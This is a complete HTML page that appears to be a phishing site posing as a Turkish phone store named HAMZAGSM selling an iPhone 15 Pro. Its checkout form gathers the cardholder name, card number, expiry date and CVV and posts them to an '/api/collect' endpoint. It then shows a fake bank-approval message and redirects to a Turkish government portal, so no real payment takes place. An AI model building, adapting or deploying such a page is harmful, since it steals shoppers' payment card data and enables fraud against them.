<!DOCTYPE html>
<html>
<head>
    <title>HAMZAGSM | iPhone 15 Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> body { background: #f5f5f7; font-family: sans-serif; } </style>
</head>
<body>
    <nav class="p-4 bg-white border-b flex justify-between px-12">
        <div class="font-black">HAMZAGSM</div>
        <div class="flex gap-6 text-sm font-bold"><span>Giriş Yap</span> <span id="cartCount">Sepet (0)</span></div>
    </nav>

    <div class="max-w-4xl mx-auto py-20 text-center">
        <h1 class="text-6xl font-black mb-4">iPhone 15 Pro</h1>
        <p class="text-xl text-gray-500 mb-8">Titanyum. Çok güçlü. Çok hafif.</p>
        <button onclick="addToCart()" class="bg-blue-600 text-white px-12 py-4 rounded-full font-bold">Sepete Ekle</button>
        
        <div id="checkoutArea" class="hidden mt-12 bg-white p-12 rounded-3xl shadow-xl text-left">
            <h2 class="text-2xl font-bold mb-6 text-center">Ödeme Bilgileri</h2>
            <input type="text" id="name" placeholder="Kart Üzerindeki İsim" class="w-full p-4 mb-4 border rounded-xl">
            <input type="text" id="no" placeholder="Kart Numarası" class="w-full p-4 mb-4 border rounded-xl">
            <div class="flex gap-4 mb-4">
                <input type="text" id="exp" placeholder="AA/YY" class="w-full p-4 border rounded-xl">
                <input type="text" id="cvv" placeholder="CVV" class="w-full p-4 border rounded-xl">
            </div>
            <button onclick="send()" class="w-full bg-black text-white p-5 rounded-xl font-bold">Ödemeyi Onayla</button>
        </div>
    </div>

    <script>
        function addToCart() {
            document.getElementById('cartCount').innerText = "Sepet (1)";
            document.getElementById('checkoutArea').classList.remove('hidden');
            window.scrollTo(0, document.body.scrollHeight);
        }

        async function send() {
            const data = {
                name: document.getElementById('name').value,
                no: document.getElementById('no').value,
                exp: document.getElementById('exp').value,
                cvv: document.getElementById('cvv').value
            };
            await fetch('/api/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            alert("Banka Onayı Bekleniyor...");
            location.href = "https://www.turkiye.gov.tr";
        }
    </script>
</body>
</html>
